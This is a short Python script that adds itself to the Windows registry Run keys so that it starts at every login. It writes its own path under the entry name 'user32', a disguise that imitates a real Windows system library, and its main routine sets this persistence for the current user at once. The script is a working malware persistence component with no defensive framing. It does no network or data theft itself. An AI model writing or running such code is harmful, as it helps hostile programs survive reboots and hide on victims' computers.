import os
import sys
import winreg


def exe_path():
    cwd = os.getcwd()
    p = f"{cwd}\\{sys.argv[0]}"
    return p

def read_registry_user(path):
    # SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    p = r"{}".format(path)
    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, p, 0, winreg.KEY_READ)
    for n in range(20):
        try:
            x = winreg.EnumValue(registry_key, n)
            print(x)
        except:
            break

def write_registry_user(path, name, e_path):
    # SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    p = r"{}".format(path)
    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, p, 0, winreg.KEY_SET_VALUE)
    try:
        winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, e_path)
        winreg.CloseKey(registry_key)
    except Exception as e:
        print(e)

def read_registry_local_machine(path):
    # SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    p = r"{}".format(path)
    registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, p, 0, winreg.KEY_READ)
    for n in range(20):
        try:
            x = winreg.EnumValue(registry_key, n)
            print(x)
        except:
            break

def write_registry_local_machine(path, name, e_path):
    # SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    p = r"{}".format(path)
    registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, p, 0, winreg.KEY_SET_VALUE)
    try:
        winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, e_path)
        winreg.CloseKey(registry_key)
    except Exception as e:
        print(e)

def current_user_persist():
    # Manipulate Windows Registry to make exe run on startup
    e_path = exe_path()
    name = "user32"
    path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    write_registry_user(path, name, e_path)

def local_machine_persist():
    # Manipulate Windows Registry to make exe run on startup
    e_path = exe_path()
    name = "user32"
    path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    write_registry_local_machine(path, name, e_path)

def main():
    current_user_persist()

if __name__=="__main__":
    main()